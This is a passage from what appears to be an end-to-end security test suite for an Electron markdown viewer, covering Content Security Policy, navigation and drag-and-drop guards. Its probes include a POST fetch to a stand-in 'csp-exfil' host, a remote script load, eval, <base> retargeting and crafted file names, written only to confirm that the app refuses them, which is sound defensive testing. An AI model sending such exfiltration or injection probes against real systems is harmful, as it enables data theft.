      const a = document.querySelector('#viewer area');
      return a ? { present: true, href: a.getAttribute('href') } : { present: false };
    })()
  `);
  // Stub the external opener *inside the renderer* - test-render-security.js
  // runs in the main process, and patching its own require('electron') would
  // leave the renderer's copy untouched and the assertion vacuous.
  await exec(`
    window.__externalUrl = null;
    window.__savedOpenExternal = require('electron').shell.openExternal;
    require('electron').shell.openExternal = (u) => {
      window.__externalUrl = u;
      return Promise.resolve();
    };
    null;
  `);
  const urlBeforeArea = win.webContents.getURL();
  // A synthetic .click() is a faithful stand-in for a real pointer HERE, and
  // that was MEASURED rather than assumed - the question "does this assertion
  // validate real image-map input, or only a hand-dispatched event?" is exactly
  // the shape that has produced vacuous passes elsewhere in this project.
  // Probed with a trusted CDP Input.dispatchMouseEvent at a point proven by
  // elementFromPoint to be topmost-AREA, with a plain <a> as a positive control:
  // the delivered event had target=AREA and isTrusted=true, closest('a, area')
  // found the AREA, shell.openExternal received https://probe.invalid/area and
  // the top frame did not move - i.e. byte-identical routing to the line below.
  // Chromium hit-tests the <area>, not the <img>; the app's image pop-out
  // overlay (button.img-zoom-btn) occludes only the centre band of the image,
  // which is why the aim point matters and why the first probe run measured the
  // overlay and reported a convincing false negative.
  await exec(`document.querySelector('#viewer area').click(); null`);
  await sleep(700);
  const urlAfterArea = win.webContents.getURL();
  const externalUrl = await exec(`window.__externalUrl`);
  await exec(`
    require('electron').shell.openExternal = window.__savedOpenExternal;
    delete window.__savedOpenExternal;
    null;
  `);
  check(
    "SEC-11 an <area href> is routed through the link policy, not Chromium",
    areaState.present === true &&
      areaState.href === "https://probe.invalid/area" &&
      externalUrl === "https://probe.invalid/area" &&
      urlAfterArea === urlBeforeArea,
    JSON.stringify({ areaState, externalUrl, urlBeforeArea, urlAfterArea }),
  );

  // ==========================================================================
  // SEC-09 - Content Security Policy on the main window
  //
  // These probes deliberately build elements with document.createElement and
  // call eval/fetch directly instead of going through markdown. The sanitizer
  // already stops most of this markup, so routing through render() would test
  // DOMPurify a second time and pass with the CSP deleted. The layer under
  // test here is the policy itself, so the sanitizer is bypassed on purpose.
  //
  // A violation is reported to `securitypolicyviolation` on the document that
  // owns the blocked load. That makes it the only way to tell "the CSP refused
  // this" apart from "the network refused this" - which matters because every
  // probe host below is unresolvable.
  //
  // Note the @@@html frame check above doubles as the control for the
  // 'unsafe-inline' decision: an about:srcdoc frame inherits this policy, so
  // if 'unsafe-inline' were dropped from script-src, `frameNav.ran` there goes
  // false and that check fails.
  await exec(`
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__csp.push({ d: e.violatedDirective, u: String(e.blockedURI || '') });
    });
    null;
  `);
  const cspHits = (frag, dir) =>
    exec(
      `window.__csp.some(v => v.d.indexOf(${JSON.stringify(dir)}) === 0 && v.u.indexOf(${JSON.stringify(frag)}) >= 0)`,
    );
  // securitypolicyviolation is delivered asynchronously, and how long that
  // takes varies with machine load - a fixed sleep is a coin flip that only
  // ever loses on a busy machine (observed: object-src arriving after 600ms
  // during a full-suite run, passing standalone). Poll for the violation
  // instead, so a slow delivery costs time rather than correctness.
  //
  // Only usable for the POSITIVE assertions. Absence cannot be polled for, so
  // the "not refused" cases keep a fixed settle.
  const waitForCsp = async (frag, dir, budgetMs) => {
    const deadline = Date.now() + (budgetMs || 8000);
    for (;;) {
      if (await cspHits(frag, dir)) return true;
      if (Date.now() > deadline) return false;
      await sleep(100);
    }
  };

  check(
    "SEC-09 a Content-Security-Policy meta is present in index.html",
    (await exec(
      `!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')`,
    )) === true,
  );

  // A remote script is the vector the vendoring work in SEC-16 removed by
  // hand; this makes it structurally impossible to reintroduce at runtime.
  await exec(`
    window.__remoteScriptRan = false;
    const s = document.createElement('script');
    s.src = 'https://probe.invalid/csp-remote.js';
    document.body.appendChild(s);
    null;
  `);
  await sleep(600);
  check(
    "SEC-09 a remote <script src> is refused by script-src",
    (await waitForCsp("probe.invalid", "script-src")) === true &&
      (await exec(`window.__remoteScriptRan === false`)) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // No 'unsafe-eval'. Measured, not assumed: mermaid 11 and Prism both render
  // under this policy, so nothing on the render path needs it.
  const evalState = await exec(`
    (() => {
      try { (0, eval)('1+1'); return 'ran'; }
      catch (e) { return e && e.name ? e.name : 'threw'; }
    })()
  `);
  check(
    "SEC-09 eval() is blocked (script-src carries no 'unsafe-eval')",
    evalState === "EvalError",
    String(evalState),
  );

  // connect-src is the directive that actually earns its place: it is the
  // difference between "an injected script can read your files" and "an
  // injected script can read your files and post them somewhere".
  await exec(`
    fetch('https://probe.invalid/csp-exfil', { method: 'POST', body: 'x' })
      .then(() => {}, () => {});
    null;
  `);
  await sleep(600);
  check(
    "SEC-09 an outbound fetch to an unlisted host is refused by connect-src",
    (await waitForCsp("probe.invalid", "connect-src")) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // SEC-09 is now resolved by REMOVAL rather than by relocation. The feature
  // that sent the reader's document to translate.googleapis.com is gone, so
  // the property to defend is no longer "the renderer cannot reach it while
  // the main process can" but "nothing in this app reaches it at all".
  //
  // Two independent oracles, because either alone is weak: the renderer's CSP
  // (a live refusal, but blind to the main process, which has no CSP), and the
  // shipped main-process source (blind to runtime, but the only place an
  // outbound request could now be built).
  await exec(`
    fetch('https://translate.googleapis.com/translate_a/single?client=gtx')
      .then(() => {}, () => {});
    null;
  `);
  check(
    "SEC-09 the former translation endpoint is refused (connect-src 'none')",
    (await waitForCsp("translate.googleapis.com", "connect-src")) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // The IPC route must be gone, not merely unused: while the handler exists,
  // any script in the Node-privileged renderer can invoke it and exfiltrate
  // document text through the main process, where connect-src does not apply.
  const gone = await exec(`
    require('electron').ipcRenderer.invoke('translate-text',
      { text: 'hello', targetLang: 'fr' })
      .then(() => 'resolved', (e) => String(e && e.message))
  `);
  const mainSrc = fs.readFileSync(path.join(__dirname, "..", "src", "main.js"), "utf8");
  // Deliberately matches the host in code, not the word "translation": the
  // comment recording this removal names the endpoint in prose, and an oracle
  // that its own documentation can break is not an oracle. A live reference
  // would be inside a string literal or a template.
  //
  // KNOWN SCOPE, so nobody over-trusts it: this half is a change-detector, not
  // a network policy. It matches an unbroken URL inside one literal, so a
  // concatenated ("https://translate." + "googleapis.com"), base64-decoded, or
  // externally-configured endpoint would slip past it, and it reads only
  // main.js. The half that actually defends the property is the runtime probe
  // above - a route that answers is a route that can exfiltrate, however its
  // URL was spelled. The two are ANDed so the assertion is as strong as the
  // stronger of them.
  const liveEndpoint = /["'`]https?:\/\/[^"'`]*translate\.googleapis\.com/.test(
    mainSrc,
  );
  check(
    "SEC-09 the translate-text IPC route and its endpoint are removed from main.js",
    /No handler registered/.test(gone) && liveEndpoint === false,
    JSON.stringify({ gone, liveEndpoint }),
  );

  // <base> rewrites the resolution of every relative URL already in the
  // document, retroactively. base-uri 'none' is the only thing that stops it.
  const baseState = await exec(`
    (() => {
      const before = document.baseURI;
      const b = document.createElement('base');
      b.href = 'https://probe.invalid/base/';
      document.head.appendChild(b);
      const after = document.baseURI;
      b.remove();
      return { changed: before !== after };
    })()
  `);
  await sleep(400);
  check(
    "SEC-09 <base href> cannot retarget relative URLs (base-uri 'none')",
    baseState.changed === false &&
      (await waitForCsp("probe.invalid", "base-uri")) === true,
    JSON.stringify({ baseState, csp: await exec(`window.__csp`) }),
  );

  const objState = await exec(`
    (() => {
      const o = document.createElement('object');
      o.id = '__cspObjectProbe';
      o.data = 'https://probe.invalid/csp.swf';
      document.body.appendChild(o);
      // Reading layout here is load-bearing, not diagnostic. Chromium only
      // fetches <object data> once the element has been laid out, and it
      // throttles rendering for an occluded/background window - which is
      // exactly what this window is during an unattended full-suite run. Left
      // to itself the object is never laid out, never fetched, and never
      // refused, so the assertion below failed intermittently (and only when
      // run after another suite) against a policy that was working perfectly.
      // getBoundingClientRect() forces the layout synchronously.
      const r = o.getBoundingClientRect();
      const cs = getComputedStyle(o);
      return {
        connected: o.isConnected,
        w: r.width, h: r.height,
        display: cs.display,
        parent: o.parentElement && o.parentElement.tagName,
        bodyChildren: document.body.children.length,
      };
    })()
  `);
  await sleep(600);
  check(
    "SEC-09 plugin content is refused by object-src 'none'",
    (await waitForCsp("probe.invalid", "object-src")) === true,
    // The element's own state is reported alongside the violation list: an
    // <object> that never got a layout box is never fetched, so it would never
    // provoke a violation either - a very different failure from "object-src
    // stopped blocking", and indistinguishable from the violation list alone.
    JSON.stringify({ objState, csp: await exec(`window.__csp`) }),
  );

  // img-src deliberately keeps https:. Remote images in markdown are a real
  // feature and blocking them would be a silent rendering regression; the
  // read-receipt exposure that leaves is recorded in the audit rather than
  // traded away here. Cleartext http: is not kept, and this pins both halves
  // of that decision so neither can drift unnoticed.
  await exec(`
    const a = document.createElement('img');
    a.src = 'http://probe.invalid/cleartext.png';
    document.body.appendChild(a);
    const b = document.createElement('img');
    b.src = 'https://probe.invalid/secure.png';
    document.body.appendChild(b);
    null;
  `);
  await sleep(700);
  check(
    "SEC-09 img-src refuses cleartext http: but still allows https:",
    (await waitForCsp("cleartext.png", "img-src")) === true &&
      (await cspHits("secure.png", "img-src")) === false,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // Control: the app loads mermaid at runtime by appending a <script src> to a
  // local path. If 'self' did not match on a file:// origin, every diagram in
  // the app would silently stop rendering - and this is the assertion that
  // says so out loud.
  await render("# csp\n\n```mermaid\ngraph TD\n  A[a] --> B[b]\n```\n", "full", 3000);
  check(
    "SEC-09 script-src 'self' still permits the app's own local scripts",
    (await exec(`typeof window.mermaid`)) === "object" &&
      (await exec(
        `!!document.querySelector('#viewer .mermaid svg') || !!document.querySelector('#viewer svg[id^="mermaid"]')`,
      )) === true &&
      (await cspHits("mermaid", "script-src")) === false,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // <meta http-equiv="refresh"> is the other markup-only route. DOMPurify drops
  // <meta>; assert it, so a future ADD_TAGS change cannot quietly re-enable it.
  await render(
    '# Nav\n\n<meta http-equiv="refresh" content="0;url=https://probe.invalid/mr">\n',
    "full",
    600,
  );
  check(
    "SEC-11 <meta http-equiv=refresh> does not survive sanitization",
    (await exec(`document.getElementById('viewer').querySelectorAll('meta').length`)) === 0,
  );

  // window.open must be denied by setWindowOpenHandler. Electron returns null
  // for a denied open, so this is observable from the renderer itself.
  check(
    "SEC-11 window.open from the main window is denied",
    (await exec(`window.open('https://probe.invalid/wo') === null`)) === true,
  );

  // The load-bearing one: an actual navigation attempt. A local file is used
  // rather than a remote URL so the result cannot be confused with a network
  // failure - if the guard were absent this page would commit successfully and
  // getURL() would change. Placed last because that failure destroys the
  // harness's own document.
  const navProbe = path.join(dir, "nav-probe.html");
  fs.writeFileSync(navProbe, "<html><body>navigated</body></html>", "utf8");
  const urlBefore = win.webContents.getURL();
  await exec(
    `window.location.href = ${JSON.stringify("file:///" + navProbe.replace(/\\/g, "/"))}; null`,
  );
  await sleep(900);
  const urlAfter = win.webContents.getURL();
  check(
    "SEC-11 main-window navigation away from index.html is blocked",
    urlAfter === urlBefore && /index\.html$/.test(urlAfter),
    `before=${urlBefore} after=${urlAfter}`,
  );

  // Nothing above should have produced an uncaught renderer error. `errs` was
  // snapshotted before the navigation probes because a failed guard destroys
  // the document that holds it; this second read catches anything the probes
  // themselves raised, and is monotonic so it cannot regress the first check.
  const errsAfter = await exec(`window.__e2eErrors`);
  check(
    "no uncaught renderer errors",
    Array.isArray(errs) &&
      errs.length === 0 &&
      Array.isArray(errsAfter) &&
      errsAfter.length === 0,
    JSON.stringify({ errs, errsAfter }),
  );

  // ── Drag-and-drop file open ────────────────────────────────────────────
  // Ported from upstream ef81474. It reuses the open-file-path IPC that
  // markdown links already use (section 12), so it grants nothing new - the
  // renderer runs with nodeIntegration and could read any file itself. What is
  // new is the ease of pointing it at something that is not a document:
  // openFile() applies no extension or size check, so without a guard here a
  // dropped video is read into memory as UTF-8 and rendered.
  {
    await exec(`
      (() => {
        const { ipcRenderer, webUtils } = require('electron');
        window.__drop = { ipc: [], notes: [] };
        window.__dropRestore = {
          send: ipcRenderer.send,
          notify: window.showNotification,
          getPath: webUtils.getPathForFile,
        };
        window.__dropConfirm = true;
        ipcRenderer.send = function (channel, ...args) {
          if (channel === 'open-file-path') { window.__drop.ipc.push(String(args[0])); return; }
          return window.__dropRestore.send.call(ipcRenderer, channel, ...args);
        };
        window.showNotification = (m) => { window.__drop.notes.push(String(m)); };
        window.confirm = () => window.__dropConfirm === true;
        // A synthetic File never came from a real drag, so the real resolver
        // returns an empty string. Stubbing it is what makes the ACCEPT path
        // observable at all; the reject path is decided before it is reached.
        webUtils.getPathForFile = (f) => 'C:\\\\dropped\\\\' + f.name;
        window.__fireDrag = (type, names) => {
          const dt = new DataTransfer();
          (names || []).forEach((n) => dt.items.add(new File(['# hi'], n)));
          const ev = new DragEvent(type, { dataTransfer: dt, bubbles: true, cancelable: true });
          window.dispatchEvent(ev);
          return ev;
        };
        return true;
      })()
    `);

    const dropReset = () => exec(`(() => { window.__drop.ipc.length = 0; window.__drop.notes.length = 0; document.body.classList.remove('drop-active'); return null; })()`);

    // The overlay, and where its text comes from.
    const enter = await exec(`(() => {
      window.__fireDrag('dragenter', ['a.md']);
      return { active: document.body.classList.contains('drop-active'),
               label: document.body.dataset.dropLabel };
    })()`);
    check(
      "dragging a file over the window shows the drop overlay",
      enter.active === true,
      JSON.stringify(enter),
    );
    check(
      "the drop overlay's label comes from the string table, not the stylesheet",
      enter.label === (await exec(`i18n('drop.hint')`)) && !!enter.label,
      JSON.stringify(enter),
    );

    // dragenter/dragleave bubble from every child, so the overlay has to be
    // reference-counted or it flickers off the moment the pointer crosses an
    // element boundary mid-drag.
    //
    // Seeded with an explicit dragend (which zeroes the counter) and then TWO
    // enters, rather than borrowing the single enter the previous test left
    // behind: depending on that residue meant reordering or resetting anything
    // above would break this test while the product stayed correct.
    const counted = await exec(`(() => {
      window.__fireDrag('dragend', []);
      window.__fireDrag('dragenter', ['a.md']);
      window.__fireDrag('dragenter', ['a.md']);
      const bothIn = document.body.classList.contains('drop-active');
      window.__fireDrag('dragleave', ['a.md']);
      const stillUp = document.body.classList.contains('drop-active');
      window.__fireDrag('dragleave', ['a.md']);
      return { bothIn, stillUp, downAfterLast: !document.body.classList.contains('drop-active') };
    })()`);
    check(
      "the drop overlay survives a dragleave from a child element",
      counted.bothIn === true && counted.stillUp === true,
      JSON.stringify(counted),
    );
    check(
      "the drop overlay goes away once the drag really has left",
      counted.downAfterLast === true,
      JSON.stringify(counted),
    );

    await dropReset();
    const accepted = await exec(`(() => {
      window.__fireDrag('drop', ['notes.md']);
      return { ipc: window.__drop.ipc.slice(), notes: window.__drop.notes.slice(),
               overlay: document.body.classList.contains('drop-active') };
    })()`);
    check(
      "dropping a markdown file asks the main process to open exactly that path",
      accepted.ipc.length === 1 && /notes\.md$/.test(accepted.ipc[0]),
      JSON.stringify(accepted),
    );
    check(
      "dropping a file clears the overlay",
      accepted.overlay === false,
      JSON.stringify(accepted),
    );

    // The guard. Each of these would otherwise be read whole into a string and
    // handed to the markdown renderer.
    for (const [label, name] of [
      ["an executable", "payload.exe"],
      ["a video", "holiday.mp4"],
      ["a file with no extension at all", "Makefile"],
      ["something merely markdown-ish", "notes.md.exe"],
    ]) {
      await dropReset();
      const rejected = await exec(`(() => {
        window.__fireDrag('drop', [${JSON.stringify(name)}]);
        return { ipc: window.__drop.ipc.slice(), notes: window.__drop.notes.slice() };
      })()`);
      check(
        `dropping ${label} is refused rather than opened`,
        rejected.ipc.length === 0,
        JSON.stringify(rejected),
      );
      check(
        `dropping ${label} tells the reader why`,
        rejected.notes.length === 1 && rejected.notes[0].includes(name),
        JSON.stringify(rejected),
      );
    }

    // A file name is not a safe replacement string. `String.prototype.replace`
    // expands `$&`, "$`", `$'` and `$$` found in the REPLACEMENT, so a file the
    // reader did not name themselves can garble its own error message.
    await dropReset();
    const dollarName = "a$'$&x.exe";
    const dollar = await exec(`(() => {
      window.__fireDrag('drop', [${JSON.stringify(dollarName)}]);
      return { ipc: window.__drop.ipc.slice(), notes: window.__drop.notes.slice() };
    })()`);
    check(
      "a rejected file name is reported literally, not as a replacement pattern",
      dollar.ipc.length === 0 &&
        dollar.notes.length === 1 &&
        dollar.notes[0].includes(dollarName),
      JSON.stringify(dollar),
    );

    // Synthetic dispatch bypasses the browser's default-action gate, so no
    // amount of drop testing proves a REAL drop is ever delivered. Only
    // dragover being cancelled does: uncancelled, the window navigates to the
    // dropped file instead of opening it.
    await dropReset();
    const overCancelled = await exec(`(() => {
      const ev = window.__fireDrag('dragover', ['a.md']);
      return { cancelable: ev.cancelable, prevented: ev.defaultPrevented };
    })()`);
    check(
      "a drag over the window is cancelled, so a real drop is delivered to us",
      overCancelled.cancelable === true && overCancelled.prevented === true,
      JSON.stringify(overCancelled),
    );

    // Every extension the Open File dialog offers must also be droppable, or
    // the two routes into the same function disagree about what a document is.
    await dropReset();
    const allAccepted = await exec(`(() => {
      ['a.md','a.markdown','a.mdown','a.mkd','a.mkdn','a.mmd','a.mermaid','A.MD'].forEach(n => window.__fireDrag('drop', [n]));
      return window.__drop.ipc.length;
    })()`);
    check(
      "every extension the Open File dialog accepts can also be dropped, case-insensitively",
      allAccepted === 8,
      `${allAccepted} of 8 accepted`,
    );

    // Unsaved work must not be discarded by a hand movement.
    await dropReset();
    const guarded = await exec(`(() => {
      const wasEdit = isEditMode, wasDirty = hasUnsavedChanges;
      isEditMode = true; hasUnsavedChanges = true;
      window.__dropConfirm = false;
      window.__fireDrag('drop', ['other.md']);
      const declined = window.__drop.ipc.length;
      window.__dropConfirm = true;
      window.__fireDrag('drop', ['other.md']);
      const accepted = window.__drop.ipc.length;
      isEditMode = wasEdit; hasUnsavedChanges = wasDirty;
      return { declined, accepted };
    })()`);
    check(
      "dropping a file onto unsaved work does nothing if the reader says no",
      guarded.declined === 0,
      JSON.stringify(guarded),
    );
    check(
      "dropping a file onto unsaved work proceeds once the reader agrees",
      guarded.accepted === 1,
      JSON.stringify(guarded),
    );

    // A drag that leaves the window entirely can fire no drop and, on some
    // window managers, no final dragleave - stranding the overlay over a
    // document the reader can no longer read.
    const stranded = await exec(`(() => {
      window.__fireDrag('dragenter', ['a.md']);
      const up = document.body.classList.contains('drop-active');
      window.dispatchEvent(new Event('blur'));
      return { up, cleared: !document.body.classList.contains('drop-active') };
    })()`);
    check(
      "an abandoned drag cannot strand the overlay over the document",
      stranded.up === true && stranded.cleared === true,
      JSON.stringify(stranded),
    );

    await exec(`
      (() => {
        const { ipcRenderer, webUtils } = require('electron');
        ipcRenderer.send = window.__dropRestore.send;
        window.showNotification = window.__dropRestore.notify;
        webUtils.getPathForFile = window.__dropRestore.getPath;
        document.body.classList.remove('drop-active');
        return true;
      })()
    `);
  }

  // __e2eErrors only sees what window.onerror sees. The sentinel additionally
  // watches the renderer console and the rendered document, which is where a
  // CSP misconfiguration or a mermaid error graphic shows up.
  // Prove the watcher was actually watching. Without this, "no errors were
  // recorded" and "the watcher silently stopped working" are the same result -
  // the exact vacuity this harness exists to eliminate. Both detection paths
  // are checked because they fail independently.
  const alive = await proveSentinelAlive(win, sentinel);
  check(
    "the error sentinel was demonstrably watching both channels",
    alive.console === true && alive.dom === true,
    JSON.stringify(alive),
  );

  const sentinelReport = await sentinel.stop();
  check(
    "nothing rendered a visible error at any point during the suite",
    sentinelReport.hits.length === 0,
    JSON.stringify(sentinelReport.hits),
  );
}

app.whenReady().then(async () => {
  const watchdog = setTimeout(() => {
    const failed = results.filter((r) => !r.ok).length;
    console.log(
      "FAIL  harness timed out after 180s - a blocking dialog is most likely open",
    );
    console.log(
      `\n=== TIMED OUT after ${results.length - failed}/${results.length} checks ===`,
    );
    app.exit(1);
  }, 180000);
  watchdog.unref?.();

  try {
    if (SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS) {
      await runFileHelpersLoaderProbe({ includeCore: false });
    } else if (SEC08_FILE_HELPERS_DOTFILE_HARNESS) {
      await runFileHelpersLoaderProbe({
        includeMissingGlobal: false,
        extensionCases: [".md"],
      });
    } else if (SEC08_FILE_HELPERS_PUBLICATION_HARNESS) {
      await runFileHelpersLoaderProbe({
        includeMissingGlobal: false,
        extensionCases: FILE_HELPER_EXTENSION_CASES.filter((filePath) => filePath !== "C:.mmd"),
      });
    } else if (SEC08_FILE_HELPERS_FOCUSED_HARNESS) {
      await runFileHelpersFocusedProbe();
    } else if (SEC08_LOADER_FOCUSED_HARNESS) {
      await runFocusedLoaderProbes();
    } else {
      await sleep(2500);
      const win = BrowserWindow.getAllWindows()[0];
      if (!win) throw new Error("no BrowserWindow was created");

      await runUtilsLoaderProbe();
      await runMermaidConfigLoaderProbe();
      await runContextMenuLoaderProbe();
      await runEmojiLoaderProbe();
      await runFileHelpersLoaderProbe();
      await win.webContents.executeJavaScript(E2E_SENTINEL);
      await run(win);
    }
  } catch (error) {
    console.log(
      "FAIL  harness threw:",
      error && error.stack ? error.stack : error,
    );
    results.push({ name: "harness", ok: false });
  }

  const failed = results.filter((r) => !r.ok).length;
  clearTimeout(watchdog);
  console.log(
    `\n=== ${results.length - failed}/${results.length} passed ===` +
      (skipped.length ? `  (${skipped.length} skipped: ${skipped.join(", ")})` : ""),
  );
  try {
    require("./test-visual-utils").releaseTempDir(dir);
  } catch (e) {
    /* ignore */
  }
  app.exit(failed === 0 ? 0 : 1);
});
